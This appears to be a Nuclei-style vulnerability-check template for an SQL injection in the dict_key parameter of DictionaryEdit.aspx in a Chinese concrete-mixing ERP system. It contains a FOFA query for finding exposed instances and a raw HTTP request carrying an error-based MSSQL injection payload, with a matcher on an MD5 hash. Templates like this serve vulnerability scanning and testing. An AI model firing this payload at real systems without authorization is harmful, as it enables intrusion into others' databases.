id: lotus-ERP-DictionaryEdit-sqli

info:
  name: lotus-ERP-DictionaryEdit-sqli
  author: linfeng7z
  severity: critical
  description: 商混ERP DictionaryEdit.aspx 接口dict_key参数存在SQL注入漏洞。
  tags: lotus,sqli,erp
  metadata:
    fofa-qeury: title="商混ERP系统"

http:
  - raw:
      - |
        GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','852963')),3,32))-- HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"662be8a28444fe9b80595f92b8493fc4") && contains(header,"text/html")'
